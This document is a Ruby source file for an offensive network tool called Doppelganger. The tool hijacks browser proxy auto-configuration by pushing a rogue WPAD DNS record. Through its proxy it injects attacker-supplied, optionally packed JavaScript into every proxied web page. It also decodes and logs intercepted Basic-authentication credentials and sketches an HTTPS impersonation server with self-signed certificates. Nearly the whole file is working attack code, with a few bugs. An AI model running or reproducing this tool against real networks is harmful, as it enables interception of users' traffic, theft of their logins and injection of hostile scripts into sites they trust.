#!/usr/bin/ruby
#

=begin
Copyright (c) 2008, 2009 Edward J. Zaborowski

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
=end

# define external libraries

require "optparse"
require "socket"
require "net/http"
require "net/https"
require "webrick"
require "webrick/https"
require "webrick/httpproxy"
require "webrick/httputils"
require "pp"
require "base64"
require "rubygems"
require "dnsruby"
require "packr"

if RUBY_PLATFORM =~ /mswin32/
  require "win32/process"
end

$eviltwin_mapping = nil
$eviltwins = []

$doppelganger_config = {}

class Doppelganger
	@config = nil

	@Program = nil
	@HttpdServer = nil
	@ProxyServer = nil

	@ProxyAddr = nil
	@ProxyPort = 8080

	@HttpdAddr = nil
	@HttpdPort = 80
	@HttpdFileRoot = "./htdocs/"

	@DnsDomain = nil
	@DnsServer = nil

	@LogDir = nil

	def initialize(config)
		$doppelganger_config = config
		@config = config

		puts "Starting Doppelganger"
		@Program = Doppelganger::Program.new(config)
		
		@ProxyAddr = config[:ProxyAddr]
		@ProxyPort = config[:ProxyPort]

		@HttpdAddr = config[:HttpdAddr]
		@HttpdPort = config[:HttpdPort]
		@HttpdFileRoot = config[:HttpdFileRoot]

		@LogDir = config[:LogDir]

		if @LogDir == nil
			@LogDir = "./logs/"
			config[:LogDir] = @LogDir
		end

		if !File.directory? @LogDir
			puts "Log directory doesn't exist. Creating..."
			Dir.mkdir(@LogDir)
		end

		if config[:TargetDomain]
			@Program.UpdateDNS
		end

		@ProxyAddr = @HttpdAddr = @Program.GetIPAddress
		config[:HttpdAddr] = @HttpdAddr
		config[:ProxyAddr] = @ProxyAddr
		#config[:ProxyInclusionFile] = "./include.txt"
		#config[:ProxyExclusionFile] = "./exclude.txt"

		puts "Binding to IP Address: " + @HttpdAddr		

		@HttpdServer = Doppelganger::Httpd.new(config)
		@HttpdServer.Start

		@ProxyServer = Doppelganger::Proxy.new(config)
		@ProxyServer.Start

		Process.wait

		$eviltwins.each {|twin| 
			twin.Shutdown 
		}

		@HttpdServer.remove_generated_files
	end

	class SSLTwin
		@config = nil

		@Server = nil
		@EvilTwinPid = nil

		def initialize(config)	
			config[:ProxyPort] = 0
			@config = config			
		end

		def Server
			@Server
		end

		def Start
			host = @config[:Server]
			port = @config[:ProxyPort]

			@Server = WEBrick::HTTPServer.new(
				:ServerName => host,
				:Port => port,
				:SSLEnable => true,
				:SSLVerifyClient => ::OpenSSL::SSL::VERIFY_NONE,
				:SSLCertName => [['C', 'US'], ['O', host], ['CN', host], ['OU', rand(65535).to_s]],
				:DocumentRoot => "/tmp")

		@Server.mount("/", DoppelgangerSSLIntermediary)
		

		puts "Starting EvilTwin Proxy server: " + host
		trap("INT") { |sig|
			puts "Shutting down EvilTwin Proxy server:" + host
			@Server.shutdown 
		}

		@EvilTwinPid = fork do
			@Server.start
		end

		$eviltwins << self
		return {
			:Server => host,
			:Port => @Server.config[:Port]
		}
	end
	
		def Shutdown
			host = @config[:Server]
			puts "Shutting down EvilTwin Proxy server:" + host
			@Server.shutdown 
		end
	end

	class Proxy
		@InjectionScripts = nil
		@PackedScripts = nil
		@FakeServerFiles = nil

		@ProxyAddr = nil
		@ProxyPort = nil
		@ProxyExclusionList = nil
		@ProxyInclusionList = nil
		@ProxyExclusionFile = nil
		@ProxyInclusionFile = nil

		@HttpdAddr = nil
		@HttpdPort = nil
		@HttpdFileRoot = nil

		@BasicAuthLog = nil

		@LogDir = nil

		@Server = nil

		@RandomNum = 0

		def initialize(config)				
			@InjectionScripts = Array.new
			$doppelganger_config[:CustomJavascript].each { |file|				
				puts "Adding custom JS file: #{file}"
				if file =~ /.tpl/
					@InjectionScripts.push(file.gsub!(/.tpl/, ""))
				else
					@InjectionScripts.push(file)
				end
				
			}
			
			@PackedScripts = {}
			@FakeServerFiles = ["/doppelganger"]

			machine_bytes = ['foo'].pack('p').size
			machine_bits = machine_bytes * 8
			max_unsigned = 2**machine_bits -1

			@RandomNum = rand(max_unsigned);

			@ProxyAddr = config[:ProxyAddr]
			@ProxyPort = config[:ProxyPort]			
			@ProxyInclusionFile = config[:ProxyInclusionFile]
			@ProxyExclusionFile = config[:ProxyExclusionFile]
			@ProxyExclusionList = nil
			@ProxyInclusionList = nil
			@ProxyPid = nil

			@HttpdFileRoot = config[:HttpdFileRoot]

			if @ProxyInclusionFile != nil
				if @ProxyExclusionFile != nil
					puts "Warning: Inclusion & exclusion list provided. Ignoring exclusions."
				end
				inclusion_file = File.open(@ProxyInclusionFile, "r")
				@ProxyInclusionList = []
				begin
					while line = inclusion_file.readline
						line.chomp!
						@ProxyInclusionList << line
					end
					rescue EOFError
						inclusion_file.close
				end
				puts "Loaded " + @ProxyInclusionList.length.to_s + " inclusion(s)."
			end

			if @ProxyExclusionFile != nil && @ProxyInclusionFile == nil
				exclusion_file = File.open(@ProxyExclusionFile, "r")
				@ProxyExclusionList = []
				begin
					while line = exclusion_file.readline
						line.chomp!
						@ProxyExclusionList << line
					end
					rescue EOFError
						exclusion_file.close
				end
								puts "Loaded " + @ProxyExclusionList.length.to_s + " exclusion(s)."
			end

			@HttpdAddr = config[:HttpdAddr]
			@HttpdPort = config[:HttpdPort]
			@HttpdFileRoot = config[:HttpdFileRoot]

			@LogDir = config[:LogDir]

			@Server = nil			

			self.PrepareScripts	
		end

		def PrepareScripts
			@InjectionScripts.each { |script|
				puts "Packing script: #{script}"
				file = File.open("#{@HttpdFileRoot}#{script}", "r")						
				unpacked_code = file.read
				packed_code = Packr.pack(unpacked_code, :shrink_vars => true, :protect => ["$super"])

				@PackedScripts[script] = packed_code
				file.close
			}
		end

		def FakeServerFiles (request, response)
			header = request_get_header(request)

			uri = URI.parse(request.request_uri.to_s)
			@FakeServerFiles.each { |file| 
				if uri.path == file
					puts "Fake file found: #{file}"
					http = Net::HTTP.new(@HttpdAddr, @HttpdPort)   				
    			http.start {
      			http.request_get(uri.path, header) {|res|
						response.content_type = res['content-type']
						response.body = res.body.to_s
						#response.status = res.status
	     			}
						return true				
					}
				end
    	}
			return false
		end

		def TransformContents(request, response)
			if self.FakeServerFiles(request, response) == true
				return response
			end
			uri = URI.parse(request.request_uri.to_s)
			@InjectionScripts.each { |script| 
				script_request = "/#{@RandomNum}_#{script}"		
				if uri.path == script_request
					file = File.open("#{@HttpdFileRoot}#{script}", "r")						
					response.body = file.read
					response.status = 200
					file.close
					return response.body
				end
			}

			perform_transformation = true

			if @ProxyInclusionList != nil
				perform_tranformation = false;
				@ProxyInclusionList.each { |url|
					regex_url = Regexp.new(url)	
					if regex_url.match(request.host)					
						puts "Match found: " + request.host + ". Transforming"
						perform_tranformation = true
					end
				}
			end
			
			if @ProxyExclusionList != nil
				perform_transformation = true
				@ProxyExclusionList.each { |url|
					regex_url = Regexp.new(url)	
					if regex_url.match(request.host)					
						puts "Match found: " + request.host + ". Dropping"
						perform_tranformation = false
					end
				}
			end
						
			request.header.each { |header| 		
				item = nil
				key = header[0]				
												
				if key =~ /authorization/i
					item = header[1][0]
					if item =~ /Basic/i
						item.gsub!(/Basic/i, "")
						basic_login = Base64.decode64(item)						
						#Basic authentication logging.
						auth_log = File.open("#{$doppelganger_config[:LogDir]}/basic_auth.log", a)
						auth_log.syswrite("#{request.host} - #{basic_login}")
						auth_log.close
					else
						#TODO: Handle other authentication types
					end				
				end
			}

			if perform_transformation && response.content_type =~ /text/i
					server_url = "http://" + @HttpdAddr + ":" + @HttpdPort.to_s				
					#server_url = "#{uri.scheme}://#{uri.host}:#{uri.port}/"

					@InjectionScripts.reverse_each { |script|									
						packed_code = @PackedScripts[script]	
						script_url = "#{server_url}/#{script}"

						html = ""

						if !$doppelganger_config[:PackScripts]
							html = "<head><script src=\"#{script_url}\" language=\"javascript\" type=\"text/javascript\"></script>"
						else
							html = "<head><script language=\"javascript\" type=\"text/javascript\">#{packed_code}</script>";
						end
						if response.body != nil
							response.body.gsub!(/<head>/i) {|block| html}							
						end
					}

					googleLoadString = "<script>"

					if $doppelganger_config[:JQueryVersion]
						googleLoadString += "google.load('jquery', '#{$doppelganger_config[:JQueryVersion]}');"
					end

					if $doppelganger_config[:JQueryUIVersion]
						googleLoadString += "google.load('jqueryui', '#{$doppelganger_config[:JQueryUIVersion]}');"
					end

					if $doppelganger_config[:PrototypeVersion]
						googleLoadString += "google.load('prototype', '#{$doppelganger_config[:PrototypeVersion]}');"
					end

					if $doppelganger_config[:ScriptaculousVersion]
						googleLoadString += "google.load('scriptaculous', '#{$doppelganger_config[:ScriptaculousVersion]}');"
					end

					if $doppelganger_config[:MooToolsVersion]
						googleLoadString += "google.load('mootools', '#{$doppelganger_config[:MooToolsVersion]}');"
					end

					if $doppelganger_config[:DojoVersion]
						googleLoadString += "google.load('dojo', '#{$doppelganger_config[:DojoVersion]}');"
					end

					if $doppelganger_config[:SWFObjectVersion]
						googleLoadString += "google.load('swfobject', '#{$doppelganger_config[:SWFObjectVersion]}');"
					end

					if $doppelganger_config[:YUIVersion]
						googleLoadString += "google.load('yui', '#{$doppelganger_config[:YUIVersion]}');"
					end

					if $doppelganger_config[:ExtCoreVersion]
						googleLoadString += "google.load('extcore', '#{$doppelganger_config[:ExtCoreVersion]}');"
					end

					googleLoadString += "</script>"

					javascriptInject = "<head><script src='http://www.google.com/jsapi'></script>#{googleLoadString}"
					if response.body != nil
						response.body.gsub!(/<head>/i) {|block| javascriptInject}
					end

 					return response.body
			else
				return response.body				
			end
		end


		def Start
			proxy_logger = WEBrick::Log.new(@LogDir + "/proxy.log")
     			access_log_file = File.open(@LogDir + "/proxy_access.log", "a")
      			access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]      
      
      @Server = DoppelgangerProxy.new(
				:Logger => proxy_logger,
				:AccessLog => access_logger,
				:Port => @ProxyPort,
				:RequestCallback => Proc.new{|req,res|
					req.header.delete('accept-encoding') },
				:ProxyContentHandler => lambda {|request, response|
					response.body = self.TransformContents(request, response)})
      
			puts "Starting Doppelganger Proxy server"
			trap("INT") { |sig|
				puts "Shutting down Doppelganger Proxy server."
				@Server.shutdown 
			}

			@ProxyPid = fork do
				@Server.start
			end
		end
	
		def Shutdown
			puts "Shutting down proxy..."
		end
	end

	class Httpd
		@Templates = nil

		@ProxyAddr = nil
		@ProxyPort = nil

		@HttpdAddr = nil
		@HttpdPort = nil
		@HttpdFileRoot = nil
		@HttpdPid = nil

		@LogDir = nil

		@Server = nil

		def initialize(config)
			@Templates = Array["wpad.dat.tpl"]

			$doppelganger_config[:CustomJavascript].each { |file|
				if file =~ /.tpl/
					@Templates.push(file)
				end
				
			}

			@ProxyAddr = config[:ProxyAddr]
			@ProxyPort = config[:ProxyPort]

			@HttpdAddr = config[:HttpdAddr]
			@HttpdPort = config[:HttpdPort]
			@HttpdFileRoot = config[:HttpdFileRoot]
			@HttpdPid = nil

			@LogDir = config[:LogDir]

			self.transform_templates		
		end
	
		def transform_templates
			@Templates.each { |template| 
				new_tpl = template.gsub(/.tpl/, "")

				print "Transforming " + template + " into " + new_tpl + "... "
				
				template_file = File.open(@HttpdFileRoot + template, "r")
      	template_data = template_file.read
      	template_file.close

      	new_file = File.open(@HttpdFileRoot + new_tpl, "w")
				new_file.syswrite(template_data.gsub(/proxyIpAddr/, @ProxyAddr).gsub(/proxyPort/, @ProxyPort.to_s).gsub(/httpdIpAddr/, @HttpdAddr).gsub(/httpPort/, @HttpdPort.to_s))
      	new_file.close
				puts "done"
			}
		end

		def remove_generated_files			
			puts "Removing generated templates"
			@Templates.each { |template| 
				new_tpl = template.gsub(/.tpl/, "")
				file = @HttpdFileRoot + new_tpl
				puts "	Deleting " + file
				File.delete(file)							
			}
		end

		def Start
			http_logger = WEBrick::Log.new(@LogDir + "/http.log")
  			access_log_file = File.open(@LogDir + "/http_access.log", "a")
  			access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]
  
				system_mime_table = WEBrick::HTTPUtils::DefaultMimeTypes
				user_mime_table = system_mime_table.update(
					{
				 		"dat" => "application/x-ns-proxy-autoconfig",
						"php" => "application/xhtml+xml",
						"js" => "text/javascript"
					}
				)

				@Server = WEBrick::HTTPServer.new(
    					:Logger => http_logger,
			   		:AccessLog => access_logger,
					:MimeTypes => user_mime_table,
					:Port => @HttpdPort, 
					:DocumentRoot => @HttpdFileRoot)

				@Server.mount("/doppelganger", WEBrick::HTTPServlet::CGIHandler, "./fake_file_handler.rb")
	
				puts "Starting Doppelganger HTTPD server"
				trap("INT") { |sig|
					puts "Shutting down Doppelganger HTTPD server."
					@Server.shutdown 
				}
				
				@HttpPid = fork do
					@Server.start
				end
		end

		def Shutdown
		end
	end

	class Program	
		def initialize(config)	
		end

		def GetIPAddress
			orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true
	
			ipAddr = nil

			UDPSocket.open do |s|
				s.connect '64.233.187.99', 1
				ipAddr = s.addr.last
			end

			ensure
				Socket.do_not_reverse_lookup = orig

			return ipAddr
		end	

		def UpdateDNS
			target_domain = $doppelganger_config[:TargetDomain]
			target_name_server = $doppelganger_config[:TargetNameServer]
			target_wpad_host = $doppelganger_config[:TargetWpadHost]

			if target_wpad_host == 'auto'
				target_wpad_host = GetIPAddress
			end
			
			dns_update = Dnsruby::Update.new(target_domain)
			host = 'wpad.' + target_domain

			dns_update.absent(host, 'A')	
			dns_update.add(host, 'A', 86400, target_wpad_host)

			dns_resolver = Dnsruby::Resolver.new(:nameserver => target_name_server)

			begin
				response = dns_resolver.send_message(dns_update)
				puts 'WPAD address created'
			        return true
				
				rescue Exception => e
					puts 'Error: ' + e
					return false
			end
		end
	end
end

class DoppelgangerProxy < WEBrick::HTTPProxyServer
	alias old_proxy_connect proxy_connect
	def proxy_connect(req, res)
#		req.createDoppelganger	
		old_proxy_connect(req, res)
	end
end

class WEBrick::HTTPRequest
	def createDoppelganger
		host, port = @unparsed_uri.split(":", 2)
		ssl_twin_config = $doppelganger_config
		ssl_twin_config[:Server] = host

		if $eviltwin_mapping == nil
			$eviltwin_mapping = Hash.new()
		end
 
		if $eviltwin_mapping[@unparsed_uri] == nil
			d = Doppelganger::SSLTwin.new(ssl_twin_config)	 
			server_info =	d.Start
			$eviltwin_mapping[@unparsed_uri] = server_info
			puts "-" * 70
			puts "Starting new doppleganger"
			puts "~" * 70
			pp server_info
			puts "-" * 70
			@unparsed_uri = "10.0.1.103:" + server_info[:Port].to_s
		else
			server_info = $eviltwin_mapping[@unparsed_uri]
			@unparsed_uri = "10.0.1.103:" + server_info[:Port].to_s
		end		
	end
end

class FakeFileCGI < WEBrick::HTTPServlet::AbstractServlet
	def do_GET(request, response)
			status, content_type, body = process_request(request)
			response.status = status
			response['Content-type'] = content_type
			response.body = body		
	end

	def process_request(request)
		return "200", "text/plain", "screwed!"
	end
end

class DoppelgangerSSLIntermediary < WEBrick::HTTPServlet::AbstractServlet
	def initialize(config)
		
	end

	def do_GET(request, response)
		
	status, type, body = process_request(request)	    
	response.status = status
	response['Content-Type'] = "text/plain" #type
	response.body = body
		
  end
	
	def process_request (request)
		uri = URI.parse(request.request_uri.to_s)

		response = []

		header = request_get_header(request)

		http = Net::HTTP.new(uri.host, uri.port)
		http.use_ssl = true if uri.scheme == "https"  # enable SSL/TLS
    		http.start {
      			http.request_get(uri.path, header) {|res|
				response << res['content-type']
				response << res.body
				puts request.request_uri.to_s
				puts res['content-type']
     	 		}
    		}
		return "200", response[0], response[1]
	end

	def do_POST(request, response)
		do_GET(request, response)
	end 
end

def request_get_header(request)
	header = {}
	request.raw_header.each {|line| 
		#puts line
		key, item = line.split(":") 
		header[key] = item
	}
	return header
end

options = {}

# Set our default options
options[:HttpdPort] = 80
options[:HttpdFileRoot] = "./htdocs/"
options[:ProxyPort] = 8080
options[:LogDir] = "./logs/"
options[:JQueryVersion] = "1.3.2"
options[:CustomJavascript] = Array["utility.js", "inject.js.tpl"]
options[:PackScripts] = false

optionParser = OptionParser.new do |opts|
	opts.banner = "Usage: webdistort.rb [options]"
	opts.separator ""

	opts.on_tail("-h", "--help") do
		puts opts
		exit
	end


	opts.separator ""
	opts.separator "Optional Settings"
	opts.separator ""

	opts.on("-w", "--webport [PORT]", Integer, "Specify HTTP server port") do |w|
		options[:HttpdPort] = w
	end

	opts.on("-p", "--proxyport [PORT]", Integer, "Specify Proxy server port") do |p|
		options[:ProxyPort] = p
	end

	opts.on("-e", "--exclude [FILE]", String, "File listing web sites to exclude from mimicing.") do |e|
		options[:ProxyExclusionFile] = e
	end

	opts.on("i", "--include [FILE]", String, "File listing web sites to mimic.") do |i|
		options[:ProxyInclusionFile] = i
	end

	opts.separator ""
	opts.separator "DNS Options"
	opts.separator ""

	opts.on("--domain [DOMAIN]",  String, "The domain used to create a WPAD entry.") do |d|
		options[:TargetDomain] = d
	end

	opts.on("--nameserver [ADDRESS]", String, "The name server of the specified domain.") do |n|
		options[:TargetNameServer] = n
	end

	opts.on("--wpadhost <ADDRESS>", String, "Specify the IP of the wpad host to be entered into DNS. If no address is given Doppelganger will attempt to determine the IP address of the current host.") do |h|
		if h == nil
			options[:TargetWpadHost] = "auto"
		else
			options[:TargetWpadHost] = h
		end
	end

	opts.separator ""
	opts.separator "Javascript Options"
	opts.separator ""

	opts.on("-s", "--pack", "Pack custom scripts and place inline.") do |s|
		options[:PackScripts] = true
	end

	opts.on("-j", "--javascript file1,file2", Array, "List of custom javascript (as templates) to import (required)") do |files|
		options[:CustomJavascript] = files
	end
	
	opts.on("--jquery [VERSION]", String, "Use specified version of jquery from Google") do |v|
		options[:JQueryVersion] = v
	end

	opts.on("--jqueryui [VERSION]", String, "Use specified version of jqueryui from Google") do |v|
		options[:JQueryUIVersion] = v
	end

	opts.on("--prototype [VERSION]", String, "Use specified version of prototype from Google") do |v|
		options[:PrototypeVersion] = v
	end

	opts.on("--scriptaculous [VERSION]", String, "Use specified version of scriptaculous from Google") do |v|
		options[:ScriptaculousVersion] = v
	end

	opts.on("--mootools [VERSION]", String, "Use specified version of mootools from Google") do |v|
		options[:MooToolsVersion] = v
	end

	opts.on("--dojo [VERSION]", String, "Use specified version of dojo from Google") do |v|
		options[:DojoVersion] = v
	end

	opts.on("--swfobject [VERSION]", String, "Use specified version of swfobject from Google") do |v|
		options[:SWFObjectVersion] = v
	end

	opts.on("--yui [VERSION]", String, "Use specified version of yui from Google") do |v|
		options[:YUIVersion] = v
	end

	opts.on("--extcore [VERSION]", String, "Use specified version of extcore from Google") do |v|
		options[:ExtCoreVersion] = v
	end

end.parse!

#pp options

program = Doppelganger.new(options)
